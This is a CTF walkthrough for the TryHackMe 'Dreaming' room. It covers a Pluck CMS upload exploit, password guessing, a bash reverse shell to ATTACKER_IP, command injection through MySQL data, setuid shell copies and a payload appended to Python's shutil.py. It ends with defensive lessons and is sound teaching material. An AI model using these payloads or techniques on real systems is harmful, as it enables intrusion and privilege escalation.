# Dreaming

Solve the riddle that dreams have woven.

While the king of dreams was imprisoned, his home fell into ruins.

Can you help Sandman restore his kingdom?

room: https://tryhackme.com/room/dreaming

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/dreaming.md

-------------------

## Overview

This room involved exploiting an outdated Pluck CMS installation before moving laterally through several local users.

The attack path was:

```text
Pluck CMS RCE
    ↓
www-data
    ↓
lucien
    ↓
death
    ↓
morpheus
```

The main techniques used were:

* TCP service enumeration
* Web directory enumeration
* Weak-password discovery
* Authenticated Pluck CMS file-upload RCE
* Credential discovery in readable source code
* Password reuse
* MySQL enumeration
* Command injection through database-controlled content
* Sudo abuse
* Python standard-library hijacking
* Setuid shell creation

All passwords and flag values have been intentionally omitted.

---

# Initial Enumeration

## Port Scanning

The target initially appeared to be down:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 \
  -oN nmap-sv-all.txt TARGET_IP
```

Nmap reported:

```text
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
```

Adding `-Pn` confirmed the host was reachable, but the first high-speed scan still reported every TCP port as closed:

```bash
sudo nmap -sV -sC -Pn -p- --min-rate 5000 \
  -oN nmap-sv-all.txt TARGET_IP
```

A slower SYN scan was then performed:

```bash
sudo nmap -Pn -sS -p- --reason -T4 \
  -oN nmap-all.txt TARGET_IP
```

This revealed two open ports:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

The earlier scan was likely performed while the target services were still starting.

A targeted service scan could then be run:

```bash
sudo nmap -Pn -sC -sV -p22,80 \
  -oN nmap-targeted.txt TARGET_IP
```

The available services were:

| Port | Service | Purpose                                    |
| ---: | ------- | ------------------------------------------ |
|   22 | SSH     | Potential access after finding credentials |
|   80 | HTTP    | Primary attack surface                     |

---

# Web Enumeration

## Directory Enumeration with Gobuster

Gobuster was used to search for hidden directories and common file extensions:

```bash
gobuster dir \
  -u http://TARGET_IP/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html,bak,zip \
  -t 50 \
  -o gobuster.txt
```

The important results were:

```text
/app           (Status: 301)
/index.html    (Status: 200)
/server-status (Status: 403)
```

The `/app` directory redirected to:

```text
http://TARGET_IP/app/
```

Browsing the directory revealed a Pluck CMS installation:

```text
http://TARGET_IP/app/pluck-4.7.13/
```

---

## Identifying the CMS Version

The page source disclosed the exact CMS version:

```html
<meta name="generator" content="pluck 4.7.13" />
```

The footer also contained a link to the administration page:

```text
http://TARGET_IP/app/pluck-4.7.13/login.php
```

The site therefore used:

```text
Pluck CMS 4.7.13
```

---

# Pluck Administrator Login

## Understanding the Login Form

Unlike many applications, the Pluck administration page did not require a username.

It used only a password field.

Inspecting the login form revealed the relevant POST parameter:

```html
<input type="password" name="cont1">
```

A manual login request resembled:

```bash
curl -s -X POST \
  -d 'cont1=TEST_PASSWORD&bogus=&submit=Log+in' \
  http://TARGET_IP/app/pluck-4.7.13/login.php
```

Successful authentication could be identified by the response containing:

```text
Password correct.
```

---

## Testing Common Passwords

Before attempting a large wordlist, a small list of extremely common passwords was tested against the administrator login.

A Bash loop could be used:

```bash
for password in \
  admin \
  password \
  password123 \
  letmein \
  welcome \
  pluck
do
    echo "[*] Trying: $password"

    response=$(curl -s -X POST \
      -d "cont1=${password}&bogus=&submit=Log+in" \
      http://TARGET_IP/app/pluck-4.7.13/login.php)

    if echo "$response" | grep -q "Password correct."; then
        echo "[+] Valid password found: REDACTED"
        break
    fi
done
```

One of the very common passwords successfully authenticated to the administration panel.

The password has been omitted from this walkthrough.

This demonstrated that the CMS was protected by a weak and easily guessable administrator password.

---

# Pluck CMS Exploitation

## Searching for a Public Exploit

With the exact version identified, SearchSploit was used:

```bash
searchsploit pluck 4.7.13
```

The results included an authenticated file-upload remote-code-execution vulnerability:

```text
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)
```

The exploit could be inspected using:

```bash
searchsploit -x 49909
```

It was then copied to the current directory:

```bash
searchsploit -m 49909
```

---

## Understanding the Exploit Arguments

Inspecting the Python exploit showed that it expected four positional arguments:

```python
target_ip = sys.argv[1]
target_port = sys.argv[2]
password = sys.argv[3]
pluckcmspath = sys.argv[4]
```

The syntax was therefore:

```bash
python3 49909.py \
  <target_ip> \
  <target_port> \
  <password> \
  <pluck_path>
```

The exploit was executed with:

```bash
python3 49909.py \
  TARGET_IP \
  80 \
  'REDACTED_PASSWORD' \
  /app/pluck-4.7.13
```

The exploit authenticated to Pluck, uploaded a malicious module and returned a p0wny web shell.

---

# Initial Access as www-data

The web shell was located inside the Pluck files directory.

Running:

```bash
whoami
```

returned:

```text
www-data
```

This confirmed initial command execution as the web-server account.

The initial access chain was:

```text
Gobuster
    ↓
/app directory
    ↓
Pluck CMS 4.7.13
    ↓
Weak administrator password
    ↓
Authenticated file-upload RCE
    ↓
www-data
```

---

## Obtaining a Reverse Shell

A listener was started on the attack machine:

```bash
nc -lvnp 4444
```

The following command was executed through the web shell:

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

After receiving the connection, the shell could be upgraded:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

# Lateral Movement: www-data to lucien

## Enumerating Home Directories

The local users were inspected:

```bash
ls -la /home
```

A user named `lucien` was present.

Lucien’s home directory contained a flag file, shell-history files and an SSH directory:

```bash
ls -la /home/lucien
```

Most private files were inaccessible to `www-data`.

For example:

```bash
cat /home/lucien/.bash_history
```

returned:

```text
Permission denied
```

---

## Searching for Readable Lucien-Owned Files

A search was performed for files owned by Lucien that were readable by the current user:

```bash
find / -user lucien -type f -readable 2>/dev/null
```

The most interesting result was:

```text
/opt/test.py
```

The file was inspected:

```bash
cat /opt/test.py
```

Its logic resembled:

```python
import requests

url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "REDACTED_PASSWORD"

data = {
    "cont1": password,
    "bogus": "",
    "submit": "Log+in"
}

req = requests.post(url, data=data)

if "Password correct." in req.text:
    print("Everything is in proper order.")
else:
    print("Something is wrong.")
```

The script contained a hard-coded password for the Pluck administration page.

---

## Password Reuse

The password found inside `/opt/test.py` was reused by the local Linux account.

A clean SSH connection was established:

```bash
ssh lucien@TARGET_IP
```

After entering the recovered password, access was obtained as Lucien.

Verification:

```bash
id
```

The first user flag was available in:

```bash
cat /home/lucien/lucien_flag.txt
```

Flag value omitted.

---

# Lateral Movement: lucien to death

## Bash History Enumeration

Lucien’s Bash history was now readable:

```bash
cat ~/.bash_history
```

The history contained several important commands, including:

```text
mysql -u lucien -pREDACTED_DATABASE_PASSWORD
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

This exposed:

* Lucien’s MySQL password
* The existence of a local user named `death`
* A Python script owned by Death
* A sudo command used to execute the script as Death

---

## Checking Sudo Permissions

Lucien’s sudo permissions were checked:

```bash
sudo -l
```

The result showed:

```text
User lucien may run the following commands:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

Lucien could therefore execute one specific Python script as `death` without supplying a sudo password.

---

## Inspecting the Script Permissions

The script could not be read directly:

```bash
cat /home/death/getDreams.py
```

```text
Permission denied
```

Its permissions were:

```bash
ls -la /home/death/getDreams.py
```

```text
-rwxrwx--x 1 death death ... /home/death/getDreams.py
```

Lucien had execute access through the sudo rule but no read access.

---

## Running the Script

The script was executed as Death:

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

It returned:

```text
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician
```

The output appeared to be generated from a database.

---

# MySQL Enumeration

## Connecting as Lucien

The database credentials recovered from Bash history were used:

```bash
mysql -u lucien -p
```

The available databases were listed:

```sql
SHOW DATABASES;
```

A database named `library` was present:

```sql
USE library;
SHOW TABLES;
```

The database contained one relevant table:

```text
dreams
```

Its contents were inspected:

```sql
SELECT * FROM dreams;
```

Example contents:

```text
+---------+------------------------------------+
| dreamer | dream                              |
+---------+------------------------------------+
| Alice   | Flying in the sky                  |
| Bob     | Exploring ancient ruins            |
| Carol   | Becoming a successful entrepreneur |
| Dave    | Becoming a professional musician   |
+---------+------------------------------------+
```

These values matched the output produced by `getDreams.py`.

This indicated that the script was retrieving the `dreamer` and `dream` columns before printing them.

---

# Command Injection Through MySQL

## Testing Command Substitution

Because database-controlled values were being processed by the Python script, command substitution was tested.

One record was updated with a harmless payload:

```bash
mysql -u lucien -p'REDACTED_DATABASE_PASSWORD' library \
  -e "UPDATE dreams
      SET dream='\$(id > /tmp/death-test)'
      WHERE dreamer='Alice';"
```

The script was triggered as Death:

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

The output file was checked:

```bash
cat /tmp/death-test
```

It showed:

```text
uid=1001(death) gid=1001(death) groups=1001(death)
```

This confirmed command injection.

The database value was being passed to a shell command executed as Death.

---

## Creating a Setuid Death Shell

The injection was used to copy Bash and assign the setuid bit:

```bash
mysql -u lucien -p'REDACTED_DATABASE_PASSWORD' library \
  -e "UPDATE dreams
      SET dream='\$(cp /bin/bash /tmp/deathbash; chmod 4755 /tmp/deathbash)'
      WHERE dreamer='Alice';"
```

The Python script was triggered again:

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

The resulting binary was verified:

```bash
ls -l /tmp/deathbash
```

The permissions showed that it was owned by Death and had the setuid bit:

```text
-rwsr-xr-x 1 death death ... /tmp/deathbash
```

It was launched while preserving its effective privileges:

```bash
/tmp/deathbash -p
```

Verification:

```bash
id
```

returned:

```text
uid=1000(lucien) gid=1000(lucien) euid=1001(death)
```

The Death flag could then be read:

```bash
cat /home/death/death_flag.txt
```

Flag value omitted.

---

# Understanding getDreams.py

With Death’s effective UID, the script could be read:

```bash
cat /home/death/getDreams.py
```

The relevant code was:

```python
import mysql.connector
import subprocess

DB_USER = "death"
DB_PASS = "REDACTED_PASSWORD"
DB_NAME = "library"

def getDreams():
    connection = mysql.connector.connect(
        host="localhost",
        user=DB_USER,
        password=DB_PASS,
        database=DB_NAME
    )

    cursor = connection.cursor()
    query = "SELECT dreamer, dream FROM dreams;"
    cursor.execute(query)

    dreams_info = cursor.fetchall()

    for dream_info in dreams_info:
        dreamer, dream = dream_info
        command = f"echo {dreamer} + {dream}"
        shell = subprocess.check_output(
            command,
            text=True,
            shell=True
        )
        print(shell)
```

The vulnerable line was:

```python
command = f"echo {dreamer} + {dream}"
```

The database values were inserted directly into a shell command.

The command was then executed using:

```python
shell=True
```

This allowed shell syntax such as:

```bash
$(command)
```

to execute.

Both the `dreamer` and `dream` fields were therefore command-injection points.

---

## Clean SSH Access as Death

The script also contained Death’s MySQL password.

The same credential was reused for SSH:

```bash
ssh death@TARGET_IP
```

This provided a clean shell where both the real and effective user IDs belonged to Death.

---

# Lateral Movement: death to morpheus

## Enumerating Morpheus-Owned Files

A search was performed for readable files owned by another local user:

```bash
find / -user morpheus -type f -readable 2>/dev/null
```

Important results included:

```text
/home/morpheus/restore.py
/home/morpheus/kingdom
```

The Python script was inspected:

```bash
cat /home/morpheus/restore.py
```

Its contents were:

```python
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

The script imported `copy2` from Python’s `shutil` standard-library module.

---

## Finding the Imported Python Module

Python was used to identify the location of `shutil.py`:

```bash
python3 -c 'import shutil; print(shutil.__file__)'
```

The module was located at:

```text
/usr/lib/python3.8/shutil.py
```

Its permissions were inspected:

```bash
ls -la /usr/lib/python3.8/shutil.py
```

The result showed:

```text
-rw-rw-r-- 1 root death ... /usr/lib/python3.8/shutil.py
```

The file was owned by `root`, but its group was `death` and group-write permission was enabled.

Because the current user was Death, the Python standard-library module was writable.

This was confirmed with:

```bash
test -w /usr/lib/python3.8/shutil.py \
  && echo '[+] writable' \
  || echo '[-] not writable'
```

---

# Python Standard-Library Hijacking

## Backing Up shutil.py

Before modifying the module, a backup was created:

```bash
cp /usr/lib/python3.8/shutil.py /tmp/shutil.py.bak
```

---

## Adding a Payload

A payload was appended to the end of `shutil.py`:

```bash
cat >> /usr/lib/python3.8/shutil.py <<'PY'
import os
os.system(
    "cp /bin/bash /tmp/morpheusbash; "
    "chown morpheus:morpheus /tmp/morpheusbash; "
    "chmod 4755 /tmp/morpheusbash"
)
PY
```

The existing module was not replaced.

Appending the payload allowed the legitimate `copy2` function to remain available while adding code that would execute whenever the module was imported.

---

## Waiting for restore.py to Run

The creation of the payload binary was monitored:

```bash
watch -n 1 'ls -l /tmp/morpheusbash 2>/dev/null'
```

When `/home/morpheus/restore.py` executed as Morpheus, Python imported the modified `shutil.py`.

The appended payload therefore ran as Morpheus and created:

```text
/tmp/morpheusbash
```

---

## Obtaining a Morpheus Shell

The setuid shell was launched:

```bash
/tmp/morpheusbash -p
```

Verification:

```bash
id
```

returned:

```text
uid=1001(death) gid=1001(death) euid=1002(morpheus)
```

The Morpheus flag could then be read:

```bash
cat /home/morpheus/morpheus_flag.txt
```

Flag value omitted.

---

# Cleanup

## Restoring the Python Library

The modified standard-library module should be restored:

```bash
cp /tmp/shutil.py.bak /usr/lib/python3.8/shutil.py
```

---

## Removing Temporary Files

Temporary payloads can be removed:

```bash
rm -f /tmp/deathbash
rm -f /tmp/morpheusbash
rm -f /tmp/death-test
rm -f /tmp/shutil.py.bak
```

---

## Restoring the Database Record

The modified database value can also be restored:

```bash
mysql -u lucien -p library
```

Then:

```sql
UPDATE dreams
SET dream='Flying in the sky'
WHERE dreamer='Alice';
```

---

# Attack Chain Summary

## Initial Access

1. Scanned the target and identified ports 22 and 80.
2. Used Gobuster to discover the `/app` directory.
3. Found Pluck CMS 4.7.13.
4. Located the Pluck administrator login page.
5. Identified the single-password login form.
6. Tested a small list of extremely common passwords.
7. Authenticated using a weak administrator password.
8. Located an authenticated Pluck file-upload RCE.
9. Used the exploit to upload a malicious module.
10. Obtained command execution as `www-data`.

## www-data to lucien

1. Enumerated local users and home directories.
2. Searched for readable files owned by Lucien.
3. Found `/opt/test.py`.
4. Recovered a hard-coded Pluck password.
5. Identified password reuse.
6. Logged in over SSH as Lucien.
7. Read Lucien’s flag.

## lucien to death

1. Read Lucien’s Bash history.
2. Recovered MySQL credentials.
3. Identified the sudo-permitted `getDreams.py` script.
4. Connected to the `library` MySQL database.
5. Matched the database values to the script output.
6. Injected command substitution into the `dreams` table.
7. Triggered the script as Death.
8. Confirmed command execution as Death.
9. Created a setuid Death shell.
10. Read Death’s flag.

## death to morpheus

1. Obtained a clean SSH session as Death through password reuse.
2. Enumerated readable files owned by Morpheus.
3. Located `/home/morpheus/restore.py`.
4. Identified its import of `shutil.copy2`.
5. Located `/usr/lib/python3.8/shutil.py`.
6. Discovered that the module was group-writable by Death.
7. Appended a payload to the Python standard-library module.
8. Waited for `restore.py` to execute as Morpheus.
9. Created a setuid Morpheus shell.
10. Read Morpheus’s flag.

---

# Vulnerability Summary

| Stage                | Vulnerability                          | Impact                                                |
| -------------------- | -------------------------------------- | ----------------------------------------------------- |
| Web discovery        | Exposed application directory          | Revealed the Pluck CMS installation                   |
| Pluck login          | Weak administrator password            | Allowed authentication using common-password guessing |
| Pluck CMS            | Authenticated file-upload RCE          | Provided command execution as `www-data`              |
| `/opt/test.py`       | Hard-coded credential                  | Exposed an authentication secret                      |
| Local authentication | Password reuse                         | Allowed SSH access as Lucien                          |
| Bash history         | Sensitive commands stored in history   | Exposed database credentials and sudo usage           |
| Sudo rule            | Script executed as another user        | Created an escalation path to Death                   |
| MySQL permissions    | Lucien could modify application data   | Allowed malicious database content                    |
| `getDreams.py`       | `shell=True` with untrusted data       | Enabled command injection as Death                    |
| Death credentials    | Password reuse                         | Allowed clean SSH access as Death                     |
| `shutil.py`          | Group-writable standard-library module | Enabled Python import hijacking                       |
| `restore.py`         | Imported compromised module            | Executed attacker-controlled code as Morpheus         |

---

# Key Lessons

## Do Not Use Weak Administrator Passwords

The Pluck administration panel was protected by a password found in a short list of common choices.

Administrative accounts should use:

* Long, unique passwords
* Rate limiting
* Account lockout controls
* Multi-factor authentication where available

---

## Avoid Hard-Coded Credentials

Credentials should not be embedded directly into source code:

```python
password = "plaintext-password"
```

Secrets should instead be stored in:

* Environment variables with restricted permissions
* Secret-management systems
* Protected configuration files
* Operating-system credential stores

---

## Avoid Password Reuse

The same credentials were accepted by multiple services.

Every account and service should use a unique password.

A credential exposed in one location should not provide access to:

* SSH
* Databases
* Web administration
* Other local accounts

---

## Protect Shell History

Command history exposed database credentials and the intended sudo command.

Passwords should not be supplied directly on command lines:

```bash
mysql -u user -pPASSWORD
```

A safer approach is:

```bash
mysql -u user -p
```

This prompts for the password without storing it in shell history.

---

## Never Pass Untrusted Data to a Shell

The vulnerable code used:

```python
command = f"echo {dreamer} + {dream}"
subprocess.check_output(command, shell=True)
```

Both values originated from a database that another user could modify.

The safest replacement would simply be:

```python
print(f"{dreamer} + {dream}")
```

If a subprocess were genuinely required, arguments should be supplied as a list and `shell=False` should be used.

---

## Protect Python Standard Libraries

A system Python module was writable by an unprivileged group:

```text
-rw-rw-r-- root death /usr/lib/python3.8/shutil.py
```

System libraries should normally be owned by root and writable only by root:

```bash
chown root:root /usr/lib/python3.8/shutil.py
chmod 644 /usr/lib/python3.8/shutil.py
```

---

## Review Complete Sudo Execution Chains

A sudo rule may appear restrictive because it permits only one command:

```text
(death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

However, the security of the command also depends on:

* Database content
* Imported modules
* Configuration files
* Environment variables
* Writable directories
* External commands called by the script
* Files processed by the script

In this case, attacker-controlled database content made the restricted sudo command exploitable.

---

# Conclusion

The room demonstrated how several smaller weaknesses can be combined into a complete compromise chain.

Gobuster first revealed the hidden application directory. The Pluck administration page was then compromised through an extremely common password, allowing an authenticated file-upload vulnerability to provide command execution as `www-data`.

A hard-coded credential and password reuse enabled access as Lucien. Lucien’s shell history exposed database credentials and a sudo-permitted Python script.

The script trusted database-controlled content and passed it into a shell command with `shell=True`, allowing command injection as Death.

Finally, Death had write access to Python’s `shutil.py` standard-library module. Because a backup script imported that module while running as Morpheus, appending a payload to the library enabled Python module hijacking and code execution as Morpheus.

The complete chain was:

```text
Port enumeration
    ↓
Gobuster discovers /app
    ↓
Pluck CMS 4.7.13
    ↓
Common-password guessing
    ↓
Authenticated file-upload RCE
    ↓
www-data
    ↓
Hard-coded credential
    ↓
Password reuse
    ↓
lucien
    ↓
MySQL-controlled command injection
    ↓
death
    ↓
Writable Python standard-library module
    ↓
morpheus
```
